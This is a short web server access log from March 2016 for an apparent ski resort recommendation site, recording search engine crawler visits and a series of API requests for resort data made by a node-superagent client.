66.249.74.56 - - [30/Mar/2016:04:28:04 -0700] "GET / HTTP/1.1" 200 2614 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.74.54 - - [30/Mar/2016:04:28:11 -0700] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19447 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [30/Mar/2016:04:28:50 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 968 "-" "node-superagent/1.4.0"
104.239.130.170 - - [30/Mar/2016:04:31:08 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
180.76.15.5 - - [30/Mar/2016:04:31:41 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.79.135 - - [30/Mar/2016:04:32:17 -0700] "GET /lib/reccapi.php?resort=alpinemeadows&date=2016-01-06 HTTP/1.1" 200 716 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.143 - - [30/Mar/2016:04:32:38 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [30/Mar/2016:04:33:50 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1030 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:33:50 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1042 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:33:50 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 1053 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:33:51 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 998 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:34:51 -0700] "GET /lib/reccapi.php?resort=snowbasin HTTP/1.1" 200 1040 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:37:31 -0700] "GET /lib/reccapi.php?resort=jacksonhole HTTP/1.1" 200 1067 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:01 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 974 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:11 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 954 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:21 -0700] "GET /lib/reccapi.php?resort=sugarbush HTTP/1.1" 200 974 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:21 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 964 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:21 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:41 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 990 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:41 -0700] "GET /lib/reccapi.php?resort=arapahoebasin HTTP/1.1" 200 1099 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:41 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1079 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:42 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1029 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:42 -0700] "GET /lib/reccapi.php?resort=diamondpeak HTTP/1.1" 200 955 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:42 -0700] "GET /lib/reccapi.php?resort=homewoodmountain HTTP/1.1" 200 1001 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:39:42 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 995 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:40:01 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 1041 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:40:01 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:40:01 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1082 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:40:01 -0700] "GET /lib/reccapi.php?resort=northstar-at-tahoe HTTP/1.1" 200 973 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:40:01 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1064 "-" "node-superagent/1.4.0"
